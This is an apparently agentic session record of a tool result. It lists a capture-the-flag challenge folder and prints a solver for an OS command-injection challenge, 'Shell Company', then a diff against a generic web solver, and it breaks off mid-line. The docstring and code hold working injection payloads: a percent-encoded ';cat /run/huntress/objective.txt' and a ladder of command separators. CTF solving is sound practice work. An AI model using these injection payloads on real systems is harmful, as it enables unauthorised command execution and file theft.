{"type":"user","message":{"role":"user","content":[{"tool_use_id":"toolu_01EGxSwSKxtKeifctobaV4WB","type":"tool_result","content":"challenges/day25/web-shell-company:\nchain.json\nmastery\nmeta.json\nsingle_solve\nsolver\ntime_trial\nworker-ratchet_log-local-20261025T210643.log\n\nchallenges/day25/web-shell-company/mastery:\nattempts\nconfirmed.json\ncontract.json\nlast_timed.json\nlog.jsonl\nstart.json\nsubmissions.jsonl\nworker-generalize-local-20261025T210255.log\nworker-live-local-20261025T210248.log\n\nchallenges/day25/web-shell-company/solver:\n__pycache__\ncases\nsolve.py\n\"\"\"D25 \"Shell Company\" (web-exploitation-day-16-shell-company): OS command injection in a \"worker\" route (Gin).\n\nKit shape: /api/clues = {current_role, example_path, feature_route, framework, input_parameter}; GET feature_route\n(no params) -> 400 {\"error\":\"path_required\",\"example_path\":\"/app/static\"}; GET feature_route?path=/app/static ->\n{\"ok\":true,\"effect\":\"worker_command_completed\",\"stdout\":\"drwxr-xr-x ... /app/static\"} (an `ls -ld <path>`).\nGET feature_route?path=/app/static%3Bcat%20/run/huntress/objective.txt -> stdout gains \"proof_...\". The `;` MUST be\npercent-encoded (a raw `;` in the query string is dropped by Go's parser -> path_required). Re-runnable on any\nfresh target.\n\"\"\"\nimport json\nimport re\nimport urllib.parse\n\nfrom lib import websolve\n\nREADS = (\"cat /run/huntress/objective.txt\", \"cat /run/huntress/*\")\nSEPS = (\";{}\", \"\\n{}\", \"&&{}\", \"|{}\", \"$({})\")\n\n\ndef _route(cl, *pats):\n    for p in pats:\n        for k, v in cl.items():\n            if re.search(p, k, re.I) and isinstance(v, str) and re.fullmatch(r\"/[\\w./-]+\", v):\n                return v\n    return None\n\n\ndef exploit(base, clues):\n    cl = clues if isinstance(clues, dict) else {}\n    route = _route(cl, r\"feature|process|worker|command|exec|action\")\n1,16c1\n< #!/usr/bin/env python3\n< \"\"\"Generic web-exploitation solver -- the web LANE SEED (B2). Dispatches on GET /api/clues and solves any challenge of\n< the known kit with NO per-day code, so a web day needs no drop-time generalize. One solver serves single / time_trial /\n< every Mastery target.\n< \n<     solve.py --contract <contract.json> --artifacts <dir>   ->  {answer_id: proof} JSON on the last line\n< \n< Do NOT rewrite this. For a brand-new clue KEY (a vuln class never seen), add a handler in lib/web/handlers/ and map\n< its key there; the `default` ladder already makes a real attempt meanwhile. The post-run ratchet folds a verified new\n< handler back in. Exploit logic lives in lib/web (dispatch) + lib/web/handlers (per-class) -- standard HTTP, LLM-first.\"\"\"\n< import sys\n< from pathlib import Path\n< \n< ROOT = Path(__file__).resolve().parents[4]\n< sys.path.insert(0, str(ROOT))\n< from lib import web  # noqa: E402\n---\n> \"\"\"D25 \"Shell Company\" (web-exploitation-day-16-shell-company): OS command injection in a \"worker\" route (Gin).\n18,19c3,76","is_error":false}]},"parent_tool_use_id":null,"session_id":"89fe87c2-cca2-45f8-808b-9fa2537ce9b4","uuid":"086569eb-8930-45e0-992b-ccca6b4a507f","timestamp":"2026-10-25T13:09:17.873Z","tool_use_result":{"stdout":"challenges/day25/web-shell-company:\nchain.json\nmastery\nmeta.json\nsingle_solve\nsolver\ntime_trial\nworker-ratchet_log-local-20261025T210643.log\n\nchallenges/day25/web-shell-company/mastery:\nattempts\nconfirmed.json\ncontract.json\nlast_timed.json\nlog.jsonl\nstart.json\nsubmissions.jsonl\nworker-generalize-local-20261025T210255.log\nworker-live-local-20261025T210248.log\n\nchallenges/day25/web-shell-company/solver:\n__pycache__\ncases\nsolve.py\n\"\"\"D25 \"Shell Company\" (web-exploitation-day-16-shell-company): OS command injection in a \"worker\" route (Gin).\n\nKit shape: /api/clues = {current_role, example_path, feature_route, framework, input_parameter}; GET feature_route\n(no params) -> 400 {\"error\":\"path_required\",\"example_path\":\"/app/static\"}; GET feature_rou